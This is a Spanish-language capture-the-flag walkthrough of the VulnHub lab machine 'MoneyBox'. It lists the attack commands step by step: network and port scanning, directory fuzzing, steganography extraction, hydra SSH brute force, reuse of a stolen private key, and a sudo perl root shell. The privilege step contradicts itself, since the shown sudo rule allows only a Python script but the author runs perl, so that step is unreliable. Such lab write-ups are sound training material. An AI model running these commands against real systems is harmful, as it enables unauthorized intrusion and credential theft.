---
title: "MoneyBox — Walkthrough"
author: "Pxlymxrph"
level: "Easy"
target: "VulnHub - MoneyBox"
url: "https://www.vulnhub.com/entry/moneybox-1,653/"
date: 2025-09-23
tags: [ctf, vulnhub, linux, ssh, privesc, steganography, enum]
---

# MoneyBox — Walkthrough

**Autor:** Pxlymxrph  
**Origen:** VulnHub — MoneyBox (link arriba)  
**Objetivo:** Encontrar las 3 flags y obtener acceso root.  
**Resumen (TL;DR):**
- Descubrí la IP de la máquina en la LAN.  
- `nmap` mostró FTP (anon), SSH y HTTP.  
- Fuzzing web reveló `/blogs/`. FTP entregó una imagen con steganografía → usuario `renu`.  
- Fuerza bruta controlada con `hydra` sobre SSH → acceso `renu`.  
- Encontré `.ssh/id_rsa` → `lily`. `sudo -l` muestra `/usr/bin/python3 /opt/backup.py` NOPASSWD → uso de GTFObins/Perl para shell root.  
- Flags: user, lily, root.

## Evidencias
Imágenes en `Images/`:
![20.png](Images/20.png)
![21.png](Images/21.png)
![1.png](Images/1.png)
![1.2.png](Images/1.2.png)
![2.png](Images/2.png)
![3.png](Images/3.png)
![4.png](Images/4.png)
![5.png](Images/5.png)
![6.png](Images/6.png)
![7.png](Images/7.png)
![9.1.png](Images/9.1.png)
![10.png](Images/10.png)
![11.png](Images/11.png)
![12.png](Images/12.png)
![22.png](Images/22.png)
![13.png](Images/13.png)
![15.png](Images/15.png)
![17.png](Images/17.png)
![16.png](Images/16.png)
![18.png](Images/18.png)

## 1) Descubrimiento de red
Detecté la máquina objetivo en la red local con:

```bash
arp-scan -I eth0 --localnet --ignoredups
```

IP objetivo: **192.168.1.78**. Verifiqué cabeceras/TTL con `curl -I http://192.168.1.78` (confirma Linux). (Evidencia: `1.png`)

## 2) Escaneo de puertos y servicios
Escaneo rápido de todos los puertos:

```bash
nmap -p- -sS --min-rate 5000 192.168.1.78 -Pn -n -vvv
```

Escaneo con scripts en puertos detectados (21,22,80):

```bash
nmap -sCV -p21,22,80 192.168.1.78
```

Resultados clave:
- 21/tcp FTP (anonymous)  
- 22/tcp SSH  
- 80/tcp HTTP  
(Evidencia: `1.2.png`, `2.png`)

## 3) Enumeración web
Reconocimiento rápido:

```bash
whatweb http://192.168.1.78/
curl "http://192.168.1.78/"
```

Página estática con mensaje de “hacked”. Primer vistazo sin info útil. (Evidencia: `3.png`)

## 4) Fuzzing de directorios
Fuzzing con `gobuster` / `dirsearch`:

```bash
gobuster dir -u http://192.168.1.78/ -w /usr/share/wordlists/dirb/common.txt -t 50
```

Descubro `/blogs/`. En la fuente del blog aparece una nota que sugiere otra ruta. (Evidencia: `4.png`, `5.png`)

## 5) Pista en el HTML
Inspección manual del HTML mostró una contraseña/nota oculta en comentarios — la guardé como pista. (Evidencia: `6.png`)

## 6) FTP — descarga de imagen
Ingreso anónimo a FTP y descargo `trytofind.jpg`:

```bash
ftp 192.168.1.78
# anonymous login
get trytofind.jpg
```

(Evidencia: `7.png`)

## 7) Steganografía en la imagen
Pruebo herramientas habituales:

```bash
exiftool trytofind.jpg
stegseek trytofind.jpg rockyou.txt
steghide extract -sf trytofind.jpg
```

`steghide` devuelve un mensaje y un usuario: **renu**. (Evidencia: `9.1.png`)

## 8) Fuerza bruta SSH (laboratorio)
Intento controlar SSH con `hydra` (en laboratorio):

```bash
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.78
```

Obtuve la contraseña válida. (Evidencia: `10.png`)

> Nota: fuerza bruta sólo en entornos autorizados/CTF.

## 9) Acceso y enumeración local
Ingreso con `renu`:

```bash
ssh renu@192.168.1.78
cat /home/renu/user.txt   # flag user
cat /etc/passwd | grep "/bin/bash"
```

(Evidencia: `11.png`, `12.png`)

## 10) Movimiento lateral hacia `lily`
En `/home/renu` hallo `.ssh/id_rsa`. Uso la llave para entrar a `lily`:

```bash
ssh -i /home/renu/.ssh/id_rsa lily@localhost
```

Accedo a `lily` y obtengo la segunda flag. (Evidencia: `22.png`, `13.png`, `15.png`)

## 11) Escalada a root
Como `lily` ejecuto `sudo -l`:

```bash
sudo -l
# muestra: (ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

Uso un vector conocido (GTFObins / Perl) para obtener shell root:

```bash
sudo perl -e 'exec "/bin/sh";'
```

Consigo shell root y la flag final. (Evidencia: `17.png`, `16.png`, `18.png`)

## Resumen de comandos clave
```bash
arp-scan -I eth0 --localnet --ignoredups
nmap -p- -sS --min-rate 5000 192.168.1.78 -Pn -n -vvv
nmap -sCV -p21,22,80 192.168.1.78
whatweb http://192.168.1.78/
gobuster dir -u http://192.168.1.78/ -w /usr/share/wordlists/dirb/common.txt -t 50
ftp 192.168.1.78
steghide extract -sf trytofind.jpg
hydra -l renu -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.78
ssh renu@192.168.1.78
ssh -i /home/renu/.ssh/id_rsa lily@localhost
sudo -l
sudo perl -e 'exec "/bin/sh";'
```

## Conclusión
MoneyBox es un reto clásico: enum → stego → brute → lateral move → sudo privesc. Buen ejercicio para pulir cadena completa de ataque y detección de vectores básicos.

